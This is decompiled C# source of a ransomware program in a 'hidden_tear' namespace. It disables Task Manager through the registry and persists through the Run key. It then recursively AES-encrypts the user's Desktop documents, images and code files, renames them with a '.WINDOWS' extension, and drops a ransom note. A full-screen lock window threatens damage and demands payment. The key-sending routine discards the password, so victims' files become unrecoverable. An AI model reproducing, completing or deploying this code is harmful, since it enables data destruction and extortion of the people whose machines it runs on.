using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using hidden_tear.Properties;
using Microsoft.Win32;

namespace hidden_tear
{
	// Token: 0x02000002 RID: 2
	public class Form1 : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public Form1()
		{
			this.InitializeComponent();
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			bool flag = registryKey.GetValue("DisableTaskMgr") == null;
			if (flag)
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			else
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
			registryKey2.SetValue("Wallpaper", "0");
			registryKey2.Close();
			registryKey.Close();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002109 File Offset: 0x00000309
		private void Form1_Load(object sender, EventArgs e)
		{
			base.Opacity = 100.0;
			base.ShowInTaskbar = false;
			this.startAction();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x0000212C File Offset: 0x0000032C
		private void Form_Shown(object sender, EventArgs e)
		{
			base.Visible = false;
			base.Opacity = 100.0;
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			registryKey.SetValue("092", Application.ExecutablePath.ToString());
		}

		// Token: 0x06000004 RID: 4 RVA: 0x0000217C File Offset: 0x0000037C
		public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] array = new byte[]
			{
				1,
				2,
				3,
				4,
				5,
				6,
				7,
				8
			};
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, array, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = 1;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), 1))
					{
						cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
						cryptoStream.Close();
					}
					result = memoryStream.ToArray();
				}
			}
			return result;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002290 File Offset: 0x00000490
		public string CreatePassword(int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			Random random = new Random();
			while (0 < length--)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000022E8 File Offset: 0x000004E8
		public void SendPassword(string password)
		{
			string text = string.Concat(new string[]
			{
				this.computerName,
				"-",
				this.userName,
				" ",
				password
			});
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002328 File Offset: 0x00000528
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] array = Encoding.UTF8.GetBytes(password);
			array = SHA256.Create().ComputeHash(array);
			byte[] array2 = this.AES_Encrypt(bytesToBeEncrypted, array);
			File.WriteAllBytes(file, array2);
			File.Move(file, file + ".WINDOWS");
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002378 File Offset: 0x00000578
		public void encryptDirectory(string location, string password)
		{
			string[] array = new string[]
			{
				".txt",
				".doc",
				".docx",
				".xls",
				".xlsx",
				".ppt",
				".pptx",
				".odt",
				".jpg",
				".png",
				".csv",
				".sql",
				".mdb",
				".sln",
				".php",
				".asp",
				".aspx",
				".html",
				".xml",
				".psd",
				".URL",
				".kys",
				".bat",
				".java"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				bool flag = Enumerable.Contains<string>(array, extension);
				if (flag)
				{
					this.EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				this.encryptDirectory(directories[j], password);
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000024CC File Offset: 0x000006CC
		public void startAction()
		{
			string password = this.CreatePassword(15);
			string str = "\\Desktop\\";
			string location = this.userDir + this.userName + str;
			this.SendPassword(password);
			this.encryptDirectory(location, password);
			this.messageCreator();
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002518 File Offset: 0x00000718
		public void messageCreator()
		{
			string str = "\\Desktop\\READ_IT.txt";
			string text = this.userDir + this.userName + str;
			string[] array = new string[]
			{
				"Your files have been encrypted.",
				"Read the Program for more information",
				"read program for more information."
			};
			File.WriteAllLines(text, array);
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002568 File Offset: 0x00000768
		private void button1_Click(object sender, EventArgs e)
		{
			Form2 form = new Form2();
			form.ShowDialog();
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002584 File Offset: 0x00000784
		protected override void Dispose(bool disposing)
		{
			bool flag = disposing && this.components != null;
			if (flag)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000025BC File Offset: 0x000007BC
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
			this.label1 = new Label();
			this.label2 = new Label();
			this.button1 = new Button();
			this.pictureBox1 = new PictureBox();
			this.pictureBox1.BeginInit();
			base.SuspendLayout();
			this.label1.AutoSize = true;
			this.label1.Font = new Font("Microsoft Sans Serif", 12f, 1, 3, 0);
			this.label1.ForeColor = Color.Red;
			this.label1.Location = new Point(7, 71);
			this.label1.Name = "label1";
			this.label1.Size = new Size(1010, 25);
			this.label1.TabIndex = 0;
			this.label1.Text = "Your computer is locked. Please do not close this window as that will result in serious computer damage.";
			this.label2.AutoSize = true;
			this.label2.Font = new Font("Microsoft Sans Serif", 12f, 1);
			this.label2.ForeColor = Color.Red;
			this.label2.Location = new Point(185, 139);
			this.label2.Name = "label2";
			this.label2.Size = new Size(720, 25);
			this.label2.TabIndex = 1;
			this.label2.Text = "Click next for more information and payment on how to get your files back.";
			this.button1.BackColor = Color.Black;
			this.button1.ForeColor = Color.Red;
			this.button1.Location = new Point(373, 461);
			this.button1.Name = "button1";
			this.button1.Size = new Size(278, 88);
			this.button1.TabIndex = 2;
			this.button1.Text = "Next";
			this.button1.UseVisualStyleBackColor = false;
			this.button1.Click += this.button1_Click;
			this.pictureBox1.Image = Resources.Untitled;
			this.pictureBox1.Location = new Point(260, 206);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new Size(504, 226);
			this.pictureBox1.SizeMode = 1;
			this.pictureBox1.TabIndex = 3;
			this.pictureBox1.TabStop = false;
			base.AutoScaleDimensions = new SizeF(8f, 16f);
			base.AutoScaleMode = 1;
			this.BackColor = Color.Black;
			base.ClientSize = new Size(1025, 561);
			base.ControlBox = false;
			base.Controls.Add(this.pictureBox1);
			base.Controls.Add(this.button1);
			base.Controls.Add(this.label2);
			base.Controls.Add(this.label1);
			this.ForeColor = Color.White;
			base.FormBorderStyle = 0;
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Margin = new Padding(4);
			base.MinimizeBox = false;
			base.Name = "Form1";
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			base.StartPosition = 1;
			base.Load += this.Form1_Load;
			this.pictureBox1.EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000001 RID: 1
		private string userName = Environment.UserName;

		// Token: 0x04000002 RID: 2
		private string computerName = Environment.MachineName.ToString();

		// Token: 0x04000003 RID: 3
		private string userDir = "C:\\Users\\";

		// Token: 0x04000004 RID: 4
		private IContainer components = null;

		// Token: 0x04000005 RID: 5
		private Label label1;

		// Token: 0x04000006 RID: 6
		private Label label2;

		// Token: 0x04000007 RID: 7
		private Button button1;

		// Token: 0x04000008 RID: 8
		private PictureBox pictureBox1;
	}
}
